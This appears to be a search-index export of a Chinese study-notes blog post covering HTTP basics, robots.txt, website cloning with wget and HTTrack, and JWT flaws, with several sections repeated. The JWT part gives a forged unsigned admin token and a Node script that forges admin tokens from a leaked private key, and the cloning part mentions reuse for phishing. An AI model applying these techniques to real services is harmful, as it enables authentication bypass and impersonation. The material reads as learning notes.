消息报头之后为响应正文，是服务器向客户端发送的HTML数据 ◎HTTP请求方法\rHTTP 1.0定义了 GET、HEAD、POST HTTP 1.1新增方法：PUT、DELETE、CONNECT、OPTIONS、TRACE 目前共八种 ◎请求方法中，GET和POST最为常见，两者的区别： 1.GET方法没有请求正文，而POST方法有请求正文 2.GET方法请求数据长度限制，而POST方法请求数据没有长度限制 3.GET方法会在浏览器中显示请求的数据；而POST方法不会在浏览器中显示请求的数据，因此更为安全 （1）GET 用于获取请求页面的指定信息 POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 （2）HEAD HEAD方法除了服务器不能在响应里返回消息主体外，其他都与GET方法相同 此方法常用来检测超文本链接的有效性、可访问性和最近的改变，本方法速度最快 （3）POST POST方法与GET相似，最大的区别在GET方法没有请求内容，而POST方法是有请求内容的。POST请求最多 ◎附：http状态码 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作。 2** 成功，操作被成功接收并处理。 3** 重定向，需要进一步操作以完成请求。 4** 客户端错误，请求包含语法错误或无法完成请求。 5** 服务器错误，服务器在处理请求的过程中发生了错误。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:1:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http协议详解"},{"categories":["notes"],"content":"\r◎HTTP请求\r◎HTTP之url在浏览器地址栏输入一个URL并按回车即可发起一个HTTP请求。 URL(统一资源定位符)也被称为网页地址 标准格式：协议：//服务器IP[：端口]/路径/[？查询] 例如，https://www.qlu.edu.cn/wxxgk/list.htm ◎服务器域名：www.qlu.edu.cn ◎ 协议：https ◎http默认端口443 ◎路径wxxgk/list.htm ◎HTTP协议详解HTTP协议目前的最新版本是1.1，HTTP是一种无状态的协议，所谓无状态是指Web浏览器与服务器之间不需要建立持久的连接，即当一个客户端向服务器端发出请求，然后Web服务器返回响应，连接就关闭了，在服务器端不保留连接的有关信息。 HTTP请求只能由客户端发起，服务器不能主动向客户Duang发送数据。 ◎HTTP请求http请求包含三部分：请求行（请求方法）、请求头（消息报头）、请求正文 下面是学长抓取的例子： POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 Connection: close Content-Length: 171 sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 sec-ch-ua-platform: \"Windows\" Origin: https://www.qlunet.cn Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://www.qlunet.cn/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 //空白行，代表请求头结束 number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ //请求正文 ◎第一行是请求行： POST /inc/postdata.php HTTP/1.1 由请求方法（POST），请求路径（/inc/postdata.php）和协议版本（HTTP/1.1）3部分组成。 ◎第二行以下为请求头(也称为消息头)，、请求头由客户端自行设定。请求头与请求正文之间有一个空行 Host：请求的Web服务器域名或者ip地址 USer-Agent：HTTP客户端运行的浏览器类型的详细信息，通过该信息，Web服务器可以判断出当前HTTP请求的客户端浏览器类型，即浏览器的标识 Accept：指定客户端能够接受的内容类型，内容类型的先后次序表示客户端接受的先后次序。 Cookie：HTTP请求发送时，就会把保存在该请求域名下的所有Cookie值一起发送给Web服务器。 Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。 ◎请求正文： number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ 请求正文常出现在POST请求方法中 ◎HTTP响应HTTP响应也由三部分组成，响应行、响应头(消息报头)和响应正文(消息主题) 下面举一个栗子： HTTP/1.1 200 OK //响应行 Server: JSP3/2.0.14 //响应头 Date: Tue, 28 Sep 2021 14:38:49 GMT Content-Type: text/plain Content-Length: 16792 Connection: close ETag: \"4198-5cce21c6af4c0\" Last-Modified: Sun, 26 Sep 2021 08:53:15 GMT Accept-Ranges: bytes Access-Control-Allow-Origin: * Vary: Accept-Encoding,User-Agent Ohc-Cache-HIT: jncm74 [4] Ohc-Response-Time: 1 0 17 34 68 68 hello //响应正文 第一行为响应行，其中有HTTP版本，状态码(200)以及消息“OK” 第二行至末尾的空白行为响应头，由服务器向客户端发送 HTTP响应头中包含服务器再传递过程中，在响应行中不能完全显示的信息。 Location：控制浏览器重定向到哪个页面。 Server：服务器的banner信息。 Set-Cookie：服务器发送给客户端的Cookie设置信息。 Cache-Control：服务器控制浏览器是否要缓存网页。 消息报头之后为响应正文，是服务器向客户端发送的HTML数据 ◎HTTP请求方法\rHTTP 1.0定义了 GET、HEAD、POST HTTP 1.1新增方法：PUT、DELETE、CONNECT、OPTIONS、TRACE 目前共八种 ◎请求方法中，GET和POST最为常见，两者的区别： 1.GET方法没有请求正文，而POST方法有请求正文 2.GET方法请求数据长度限制，而POST方法请求数据没有长度限制 3.GET方法会在浏览器中显示请求的数据；而POST方法不会在浏览器中显示请求的数据，因此更为安全 （1）GET 用于获取请求页面的指定信息 POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 （2）HEAD HEAD方法除了服务器不能在响应里返回消息主体外，其他都与GET方法相同 此方法常用来检测超文本链接的有效性、可访问性和最近的改变，本方法速度最快 （3）POST POST方法与GET相似，最大的区别在GET方法没有请求内容，而POST方法是有请求内容的。POST请求最多 ◎附：http状态码 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作。 2** 成功，操作被成功接收并处理。 3** 重定向，需要进一步操作以完成请求。 4** 客户端错误，请求包含语法错误或无法完成请求。 5** 服务器错误，服务器在处理请求的过程中发生了错误。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:1:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http请求-1"},{"categories":["notes"],"content":"\r◎HTTP请求\r◎HTTP之url在浏览器地址栏输入一个URL并按回车即可发起一个HTTP请求。 URL(统一资源定位符)也被称为网页地址 标准格式：协议：//服务器IP[：端口]/路径/[？查询] 例如，https://www.qlu.edu.cn/wxxgk/list.htm ◎服务器域名：www.qlu.edu.cn ◎ 协议：https ◎http默认端口443 ◎路径wxxgk/list.htm ◎HTTP协议详解HTTP协议目前的最新版本是1.1，HTTP是一种无状态的协议，所谓无状态是指Web浏览器与服务器之间不需要建立持久的连接，即当一个客户端向服务器端发出请求，然后Web服务器返回响应，连接就关闭了，在服务器端不保留连接的有关信息。 HTTP请求只能由客户端发起，服务器不能主动向客户Duang发送数据。 ◎HTTP请求http请求包含三部分：请求行（请求方法）、请求头（消息报头）、请求正文 下面是学长抓取的例子： POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 Connection: close Content-Length: 171 sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 sec-ch-ua-platform: \"Windows\" Origin: https://www.qlunet.cn Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://www.qlunet.cn/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 //空白行，代表请求头结束 number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ //请求正文 ◎第一行是请求行： POST /inc/postdata.php HTTP/1.1 由请求方法（POST），请求路径（/inc/postdata.php）和协议版本（HTTP/1.1）3部分组成。 ◎第二行以下为请求头(也称为消息头)，、请求头由客户端自行设定。请求头与请求正文之间有一个空行 Host：请求的Web服务器域名或者ip地址 USer-Agent：HTTP客户端运行的浏览器类型的详细信息，通过该信息，Web服务器可以判断出当前HTTP请求的客户端浏览器类型，即浏览器的标识 Accept：指定客户端能够接受的内容类型，内容类型的先后次序表示客户端接受的先后次序。 Cookie：HTTP请求发送时，就会把保存在该请求域名下的所有Cookie值一起发送给Web服务器。 Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。 ◎请求正文： number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ 请求正文常出现在POST请求方法中 ◎HTTP响应HTTP响应也由三部分组成，响应行、响应头(消息报头)和响应正文(消息主题) 下面举一个栗子： HTTP/1.1 200 OK //响应行 Server: JSP3/2.0.14 //响应头 Date: Tue, 28 Sep 2021 14:38:49 GMT Content-Type: text/plain Content-Length: 16792 Connection: close ETag: \"4198-5cce21c6af4c0\" Last-Modified: Sun, 26 Sep 2021 08:53:15 GMT Accept-Ranges: bytes Access-Control-Allow-Origin: * Vary: Accept-Encoding,User-Agent Ohc-Cache-HIT: jncm74 [4] Ohc-Response-Time: 1 0 17 34 68 68 hello //响应正文 第一行为响应行，其中有HTTP版本，状态码(200)以及消息“OK” 第二行至末尾的空白行为响应头，由服务器向客户端发送 HTTP响应头中包含服务器再传递过程中，在响应行中不能完全显示的信息。 Location：控制浏览器重定向到哪个页面。 Server：服务器的banner信息。 Set-Cookie：服务器发送给客户端的Cookie设置信息。 Cache-Control：服务器控制浏览器是否要缓存网页。 消息报头之后为响应正文，是服务器向客户端发送的HTML数据 ◎HTTP请求方法\rHTTP 1.0定义了 GET、HEAD、POST HTTP 1.1新增方法：PUT、DELETE、CONNECT、OPTIONS、TRACE 目前共八种 ◎请求方法中，GET和POST最为常见，两者的区别： 1.GET方法没有请求正文，而POST方法有请求正文 2.GET方法请求数据长度限制，而POST方法请求数据没有长度限制 3.GET方法会在浏览器中显示请求的数据；而POST方法不会在浏览器中显示请求的数据，因此更为安全 （1）GET 用于获取请求页面的指定信息 POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 （2）HEAD HEAD方法除了服务器不能在响应里返回消息主体外，其他都与GET方法相同 此方法常用来检测超文本链接的有效性、可访问性和最近的改变，本方法速度最快 （3）POST POST方法与GET相似，最大的区别在GET方法没有请求内容，而POST方法是有请求内容的。POST请求最多 ◎附：http状态码 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作。 2** 成功，操作被成功接收并处理。 3** 重定向，需要进一步操作以完成请求。 4** 客户端错误，请求包含语法错误或无法完成请求。 5** 服务器错误，服务器在处理请求的过程中发生了错误。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:1:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http响应"},{"categories":["notes"],"content":"\r◎HTTP请求\r◎HTTP之url在浏览器地址栏输入一个URL并按回车即可发起一个HTTP请求。 URL(统一资源定位符)也被称为网页地址 标准格式：协议：//服务器IP[：端口]/路径/[？查询] 例如，https://www.qlu.edu.cn/wxxgk/list.htm ◎服务器域名：www.qlu.edu.cn ◎ 协议：https ◎http默认端口443 ◎路径wxxgk/list.htm ◎HTTP协议详解HTTP协议目前的最新版本是1.1，HTTP是一种无状态的协议，所谓无状态是指Web浏览器与服务器之间不需要建立持久的连接，即当一个客户端向服务器端发出请求，然后Web服务器返回响应，连接就关闭了，在服务器端不保留连接的有关信息。 HTTP请求只能由客户端发起，服务器不能主动向客户Duang发送数据。 ◎HTTP请求http请求包含三部分：请求行（请求方法）、请求头（消息报头）、请求正文 下面是学长抓取的例子： POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 Connection: close Content-Length: 171 sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 sec-ch-ua-platform: \"Windows\" Origin: https://www.qlunet.cn Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://www.qlunet.cn/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 //空白行，代表请求头结束 number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ //请求正文 ◎第一行是请求行： POST /inc/postdata.php HTTP/1.1 由请求方法（POST），请求路径（/inc/postdata.php）和协议版本（HTTP/1.1）3部分组成。 ◎第二行以下为请求头(也称为消息头)，、请求头由客户端自行设定。请求头与请求正文之间有一个空行 Host：请求的Web服务器域名或者ip地址 USer-Agent：HTTP客户端运行的浏览器类型的详细信息，通过该信息，Web服务器可以判断出当前HTTP请求的客户端浏览器类型，即浏览器的标识 Accept：指定客户端能够接受的内容类型，内容类型的先后次序表示客户端接受的先后次序。 Cookie：HTTP请求发送时，就会把保存在该请求域名下的所有Cookie值一起发送给Web服务器。 Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。 ◎请求正文： number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ 请求正文常出现在POST请求方法中 ◎HTTP响应HTTP响应也由三部分组成，响应行、响应头(消息报头)和响应正文(消息主题) 下面举一个栗子： HTTP/1.1 200 OK //响应行 Server: JSP3/2.0.14 //响应头 Date: Tue, 28 Sep 2021 14:38:49 GMT Content-Type: text/plain Content-Length: 16792 Connection: close ETag: \"4198-5cce21c6af4c0\" Last-Modified: Sun, 26 Sep 2021 08:53:15 GMT Accept-Ranges: bytes Access-Control-Allow-Origin: * Vary: Accept-Encoding,User-Agent Ohc-Cache-HIT: jncm74 [4] Ohc-Response-Time: 1 0 17 34 68 68 hello //响应正文 第一行为响应行，其中有HTTP版本，状态码(200)以及消息“OK” 第二行至末尾的空白行为响应头，由服务器向客户端发送 HTTP响应头中包含服务器再传递过程中，在响应行中不能完全显示的信息。 Location：控制浏览器重定向到哪个页面。 Server：服务器的banner信息。 Set-Cookie：服务器发送给客户端的Cookie设置信息。 Cache-Control：服务器控制浏览器是否要缓存网页。 消息报头之后为响应正文，是服务器向客户端发送的HTML数据 ◎HTTP请求方法\rHTTP 1.0定义了 GET、HEAD、POST HTTP 1.1新增方法：PUT、DELETE、CONNECT、OPTIONS、TRACE 目前共八种 ◎请求方法中，GET和POST最为常见，两者的区别： 1.GET方法没有请求正文，而POST方法有请求正文 2.GET方法请求数据长度限制，而POST方法请求数据没有长度限制 3.GET方法会在浏览器中显示请求的数据；而POST方法不会在浏览器中显示请求的数据，因此更为安全 （1）GET 用于获取请求页面的指定信息 POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 （2）HEAD HEAD方法除了服务器不能在响应里返回消息主体外，其他都与GET方法相同 此方法常用来检测超文本链接的有效性、可访问性和最近的改变，本方法速度最快 （3）POST POST方法与GET相似，最大的区别在GET方法没有请求内容，而POST方法是有请求内容的。POST请求最多 ◎附：http状态码 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作。 2** 成功，操作被成功接收并处理。 3** 重定向，需要进一步操作以完成请求。 4** 客户端错误，请求包含语法错误或无法完成请求。 5** 服务器错误，服务器在处理请求的过程中发生了错误。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:1:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http请求方法"},{"categories":["notes"],"content":"\rrobots文件","date":"2022-09-20","objectID":"/web_base-2022.9/:2:0","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#robots文件"},{"categories":["notes"],"content":"\r◎so，what is “robots” ？robots文件是网站和搜索引擎之间的协议，也是搜索引擎爬虫爬行网站的第一个访问的文件，官方叫做爬虫协议或者是机器人协议，robots全程为“网络爬虫排除标准”(Robots Exclusion Protocol)，我们所做的任何网站都可以通过robots协议告诉搜索引擎我们网站的哪些内容可以访问，哪些内容不能访问。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:2:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#sowhat-is-robots-"},{"categories":["notes"],"content":"\r◎robots文件的作用1.可以屏蔽网站内一些打不开的链接 2.可以屏蔽搜索引擎蜘蛛访问网站内重复的内容和页面 3.阻止搜索引擎访问网站的隐私性内容 4.阻止搜索引擎访问网站的后台内容 5.告诉搜索引擎哪些内容是需要被访问的 ","date":"2022-09-20","objectID":"/web_base-2022.9/:2:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#robots文件的作用"},{"categories":["notes"],"content":"\r◎robots文件的重要性网页中重复页面、内容或者错误页面都可以通过robots文件来屏蔽或阻止访问，否则搜索引擎蜘蛛就会认为该网站的价值较低，从而导致搜索引擎给网站的评价降低，会直接导致我们的网站排名下降。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:2:3","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#robots文件的重要性"},{"categories":["notes"],"content":"\r网站克隆","date":"2022-09-20","objectID":"/web_base-2022.9/:3:0","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#网站克隆"},{"categories":["notes"],"content":"\r前言当离线时，拥有 一份镜像进行持续观察很有效。Wooyun 被封杀，但是现在网上还有很多 Wooyun 镜像站，来继续发挥 Wooyun 的余热。镜像网站不会复制动态内容，也不会复制网站的中间件，因此这并不是对所有渗透测试环境都适用。国光我个人一般都是用来 “盗取” 炫酷的 HTML5 网站（嘘～～～），有时候用它离线存储一些网站，总之挺实用的。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#前言"},{"categories":["notes"],"content":"\r使用 wget 复制克隆网站\r介绍Kali linux 默认安装了 wget 工具，它简单使用，Pentest Box 中也集成了 wget 命令，只要在终端下敲几个命令，就可以下载整个网站的 HTML 文件。wget 不能复制服务器的程序页面，例如 PHP 脚本页面。 使用方法终端下输入: BASH wget -m -p -E -k -K -np -v http://www.baidu.com 这样就会把百度的首页复制下来，就是这么简单粗暴。这里使用了一连串的参数，可以使用 man 命令来查看 wget 的手册： BASH man wget wget 的主要参数如下: VERILOGm: 镜像，选择该选项适用于 Web 站点 p: 页面获先决条件，该选项确保 包含了请求的 图片和 CSS 脚本文件被下载 (这样可以更好的复制 HTML5 的站点) E: 适用扩展，这可以在本地另存为一个 HTML 文件 k: 转换链接，确保文件被转换，用于本地浏览 K: 转换备份文件，将会以 orig 为后缀作为原始文件 复制网站时可能会发生错误，尤其是在复制动态脚本页面的时候，这是因为生成页面的大部分代码是由动态脚本创建的，大部分站点的应用程序是不能访问到的。 注：文件一旦被下载，切忌不可以让其他人浏览和重新发布站点，这会违反版权法。（当然功放演练的话，钓鱼攻击除外） 在Linux终端中进行wget操作是，保存下来的文件会保存在终端当前所在的目录 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#使用-wget-复制克隆网站"},{"categories":["notes"],"content":"\r使用 wget 复制克隆网站\r介绍Kali linux 默认安装了 wget 工具，它简单使用，Pentest Box 中也集成了 wget 命令，只要在终端下敲几个命令，就可以下载整个网站的 HTML 文件。wget 不能复制服务器的程序页面，例如 PHP 脚本页面。 使用方法终端下输入: BASH wget -m -p -E -k -K -np -v http://www.baidu.com 这样就会把百度的首页复制下来，就是这么简单粗暴。这里使用了一连串的参数，可以使用 man 命令来查看 wget 的手册： BASH man wget wget 的主要参数如下: VERILOGm: 镜像，选择该选项适用于 Web 站点 p: 页面获先决条件，该选项确保 包含了请求的 图片和 CSS 脚本文件被下载 (这样可以更好的复制 HTML5 的站点) E: 适用扩展，这可以在本地另存为一个 HTML 文件 k: 转换链接，确保文件被转换，用于本地浏览 K: 转换备份文件，将会以 orig 为后缀作为原始文件 复制网站时可能会发生错误，尤其是在复制动态脚本页面的时候，这是因为生成页面的大部分代码是由动态脚本创建的，大部分站点的应用程序是不能访问到的。 注：文件一旦被下载，切忌不可以让其他人浏览和重新发布站点，这会违反版权法。（当然功放演练的话，钓鱼攻击除外） 在Linux终端中进行wget操作是，保存下来的文件会保存在终端当前所在的目录 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#介绍"},{"categories":["notes"],"content":"\r使用 wget 复制克隆网站\r介绍Kali linux 默认安装了 wget 工具，它简单使用，Pentest Box 中也集成了 wget 命令，只要在终端下敲几个命令，就可以下载整个网站的 HTML 文件。wget 不能复制服务器的程序页面，例如 PHP 脚本页面。 使用方法终端下输入: BASH wget -m -p -E -k -K -np -v http://www.baidu.com 这样就会把百度的首页复制下来，就是这么简单粗暴。这里使用了一连串的参数，可以使用 man 命令来查看 wget 的手册： BASH man wget wget 的主要参数如下: VERILOGm: 镜像，选择该选项适用于 Web 站点 p: 页面获先决条件，该选项确保 包含了请求的 图片和 CSS 脚本文件被下载 (这样可以更好的复制 HTML5 的站点) E: 适用扩展，这可以在本地另存为一个 HTML 文件 k: 转换链接，确保文件被转换，用于本地浏览 K: 转换备份文件，将会以 orig 为后缀作为原始文件 复制网站时可能会发生错误，尤其是在复制动态脚本页面的时候，这是因为生成页面的大部分代码是由动态脚本创建的，大部分站点的应用程序是不能访问到的。 注：文件一旦被下载，切忌不可以让其他人浏览和重新发布站点，这会违反版权法。（当然功放演练的话，钓鱼攻击除外） 在Linux终端中进行wget操作是，保存下来的文件会保存在终端当前所在的目录 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#使用方法"},{"categories":["notes"],"content":"\r使用 HTTrack 复制克隆网站\r介绍HTTrack 是一款免费的离线浏览器工具，和 wget 克隆复制镜像差不多，从服务器抓取 HTML 文件、图片、以及其他 CSS 文件并存储到你的计算机上。Kali 2.0 起默认预装了 HTTrack。 使用方法终端下输入: BASH httrack 如果没有安装这个工具的话，那就现场安装一下吧，只需要 2 个命令: BASH apt update \u0026\u0026 apt install httrack 这里提示要输入项目名称、存放网站的路径（默认为 /root/website） 和要克隆的目标站，我们这里以「搜狗浏览器官网」为例 先自定义输入「test」 然后 按下「 回车」 BASH sougou 然后默认路径 「回车」 输入想要克隆的网站 BASH http://ie.sougou.com 下面 HTTrack 提供了一些选项，我们一般选择第二本选项 Mirror Web Site(s) with Wizard（具有向导递归层级的镜像网站） 输入:2 「回车」「 回车」「 回车」 后面的一些基本设置 一般一直「回车」下去 直到网站开始克隆为止，HTTrack 就开始进行网站克隆了。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:3","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#使用-httrack-复制克隆网站"},{"categories":["notes"],"content":"\r使用 HTTrack 复制克隆网站\r介绍HTTrack 是一款免费的离线浏览器工具，和 wget 克隆复制镜像差不多，从服务器抓取 HTML 文件、图片、以及其他 CSS 文件并存储到你的计算机上。Kali 2.0 起默认预装了 HTTrack。 使用方法终端下输入: BASH httrack 如果没有安装这个工具的话，那就现场安装一下吧，只需要 2 个命令: BASH apt update \u0026\u0026 apt install httrack 这里提示要输入项目名称、存放网站的路径（默认为 /root/website） 和要克隆的目标站，我们这里以「搜狗浏览器官网」为例 先自定义输入「test」 然后 按下「 回车」 BASH sougou 然后默认路径 「回车」 输入想要克隆的网站 BASH http://ie.sougou.com 下面 HTTrack 提供了一些选项，我们一般选择第二本选项 Mirror Web Site(s) with Wizard（具有向导递归层级的镜像网站） 输入:2 「回车」「 回车」「 回车」 后面的一些基本设置 一般一直「回车」下去 直到网站开始克隆为止，HTTrack 就开始进行网站克隆了。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:3","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#介绍-1"},{"categories":["notes"],"content":"\r使用 HTTrack 复制克隆网站\r介绍HTTrack 是一款免费的离线浏览器工具，和 wget 克隆复制镜像差不多，从服务器抓取 HTML 文件、图片、以及其他 CSS 文件并存储到你的计算机上。Kali 2.0 起默认预装了 HTTrack。 使用方法终端下输入: BASH httrack 如果没有安装这个工具的话，那就现场安装一下吧，只需要 2 个命令: BASH apt update \u0026\u0026 apt install httrack 这里提示要输入项目名称、存放网站的路径（默认为 /root/website） 和要克隆的目标站，我们这里以「搜狗浏览器官网」为例 先自定义输入「test」 然后 按下「 回车」 BASH sougou 然后默认路径 「回车」 输入想要克隆的网站 BASH http://ie.sougou.com 下面 HTTrack 提供了一些选项，我们一般选择第二本选项 Mirror Web Site(s) with Wizard（具有向导递归层级的镜像网站） 输入:2 「回车」「 回车」「 回车」 后面的一些基本设置 一般一直「回车」下去 直到网站开始克隆为止，HTTrack 就开始进行网站克隆了。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:3","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#使用方法-1"},{"categories":["notes"],"content":"\r小结个人认为：wget 操作简单方便，但是克隆效果不及 HTTrack，HTTrack 虽然比 wget 稍微繁琐了一点，但是在爬一个大型网站上面，完整性要优于 wget。 对了，最后再提醒一下：注意版权。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:4","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#小结"},{"categories":["notes"],"content":"\rJWT基本概念json web token(jwt) 是一个轻量级的认证规范,这个规范允许使用jwt在用户和服务器之间传递安全可靠的信息.其本质是一个token,是一种紧凑的url安全方法,用于在网络通信的双方之间传递. 我们可以进jwt官网看一下jwt.io ","date":"2022-09-20","objectID":"/web_base-2022.9/:4:0","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#jwt基本概念"},{"categories":["notes"],"content":"\rJWT漏洞\r空加密算法jwt支持空加密算法，可以在header中指定alg为none，这样的话，只要把signature设置为空，即不添加signature字段提交到服务器，任何token都可以通过服务器验证 但是我们会发现官网是没法生成空加密的，但是我们知道它的signature是base64，所以我们直接手工生成 { \"alg\": \"None\", \"typ\": \"JWT\" } { \"iss\": \"admin\", \"iat\": 1664193697, \"exp\": 1664200897, \"nbf\": 1664193697, \"sub\": \"admin\", \"jti\": \"fa2fb0a80953bd65a5dfe2afec06048e\" } 在两段编码中间用.隔开 ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY0MTkzNjk3LAogICJleHAiOiAxNjY0MjAwODk3LAogICJuYmYiOiAxNjY0MTkzNjk3LAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiZmEyZmIwYTgwOTUzYmQ2NWE1ZGZlMmFmZWMwNjA0OGUiCn0=. (header+”.”+payload+”.”, 去掉了’.’signature字段) 空加密算法是为了调试方便，在生产环境中开启空加密模式，缺少签名保护，攻击者只要把alg字段改成none，就可以在payload中构造身份，伪造用户身份。 密钥爆破我们可以使用c-jwt-cracker-master进行jwt密钥爆破 私钥泄露攻击这里访问/private.key就能任意文件下载私钥，但是我们尝试在官网是无法生成的，但是我们可以自己写脚本生成 这里就需要在本地安装node，然后npm install jsonwebtoken const jwt = require(\"jsonwebtoken\"); var fs = require(\"fs\"); var privateKey = fs.readFileSync(\"private.key\"); var token =jwt.sign({user:'admin' },privateKey,{algorithm:'RS256'}); console.log(token); 然后写这么个脚本,生成 公钥泄露攻击jwt中最常用的两种算法为HMAC和RSA HMAC是一种对称加密算法，使用相同的密钥进行加解密 RSA是一种非对称加密算法，使用私钥加密，公钥解密 